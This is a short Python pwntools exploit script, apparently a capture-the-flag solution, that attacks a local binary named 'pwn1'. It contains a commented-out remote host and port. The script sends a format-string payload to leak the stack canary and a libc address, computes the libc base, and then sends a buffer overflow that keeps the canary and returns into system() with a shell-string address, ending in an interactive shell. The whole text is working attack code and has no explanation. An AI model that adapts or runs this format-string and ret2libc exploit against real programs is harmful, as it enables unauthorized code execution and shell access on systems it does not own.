from pwn import *
p = process('./pwn1',env = {"LD_PRELOAD" : "./libc.so.6"})
gdb.attach('pwn1','b *vul+58')
#host,port = "128.199.249.5",2222
#p = remote(host,port)
#context(log_level='debug',arch='i386')
p.sendline('%23$p %24$p')
leaked = p.recvuntil('\n')
#print leaked
ostb =0xf7fb3960 - 0xf7dc2000
leaked = leaked.replace("what to leak: ",'')
leaked = leaked.split()
system = 0x3d2e0
bin = 0x17e0af
canary = int(leaked[0],16)
libc_base = int(leaked[1],16)-ostb
print hex(canary), hex(libc_base)
exploit = "A"*64+p32(canary)+"AAAA"*3+p32(libc_base+system)+"AAAA"+p32(libc_base+bin)
p.sendline(exploit)
p.interactive()
